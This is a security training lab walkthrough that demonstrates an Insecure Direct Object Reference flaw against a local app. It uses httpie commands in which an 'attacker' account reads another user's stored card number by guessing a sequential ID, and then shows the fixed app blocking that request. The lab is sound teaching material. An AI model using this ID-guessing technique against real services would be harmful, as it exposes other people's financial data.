
PreRequisiste
*************


sudo pip3 install --upgrade httpie



Insecure Direct Object Reference - AJAX (EoP)
Instructions

Step 1: Open terminal and change to directory
cd /root/primary-key-idor

Step 2: Set the JWT pass phrase 

Universally unique identifiers (UUIDs) are 128-bit numbers that are accepted as being unique on the local system they are created on.

Generating a UUID
*****************
The uuidgen command is often already installed on Unix-like operating systems like Linux and macOS. 
If it’s not, you can install it through your package manager. On Ubuntu and Debian systems, install the uuid-runtime package.

export JWT_PASS=$(uuidgen)  

Step 3: Run the app
pip3 install -r requirements.txt

Error: Error while downloading the requirements using pip install (setup command: use_2to3 is invalid.)
Command "python setup.py egg_info" failed with error code 1 in /tmp/pip-build-BqMhb7/matplotlib/ #418

Soln : pip3 install --upgrade pip setuptools==57.5.0

python3 app.py

Step 4: Open another terminal, and create the user
http POST http://localhost:5000/create-user email=avpp@corp.com password=Hello1234

Issue : bash: http: command not found
Soln : 
export PATH=$PATH:/bin:/usr/local/bin
vi .bashrc
export PATH=$PATH:/bin:/usr/local/bin


Step 5: Now fetch the JWT token
http POST http://localhost:5000/login email=avpp@corp.com password=Hello1234
You should get the JWT token in the response

Step 6: Set the token as environment variable for accessing the other endpoints
export UTOKEN=<your-jwt-token-value>

Step 7: Now create some card entries
http POST http://localhost:5000/create-card Authorization:$UTOKEN card_num=411111111111 cvv:=211 exp:=1224

Step 8: Fetch the card details for a particular user
http GET http://localhost:5000/get-cards/avpp@corp.com Authorization:$UTOKEN

Step 9: Now create another malicious account
http POST http://localhost:5000/create-user email=attacker@corp.com password=Hello123

Step 10: Fetch the malicious user's token
http POST http://localhost:5000/login email=attacker@corp.com password=Hello123

Step 11: Set the malicious users token as environment variable
export ATOKEN=<malicious-user-jwt-token-value>

Step 12: Fetch the card details for the malicious user account (u will see the empty response)
http GET http://localhost:5000/get-cards/attacker@corp.com Authorization:$ATOKEN

Step 13: Now steal the other user's card number by guessing the user id
http GET http://localhost:5000/get-card/1 Authorization:$ATOKEN

Step 14: Go to terminal 1 and stop the app and run the secure app
python3 secure_app.py

Step 15: Go to terminal 2 and repeat step 13, you should not get the card numbers

Step 16: Now fetch the card as genuine user

http GET http://localhost:5000/get-card/1 Authorization:$UTOKEN
You should be able to fetch it
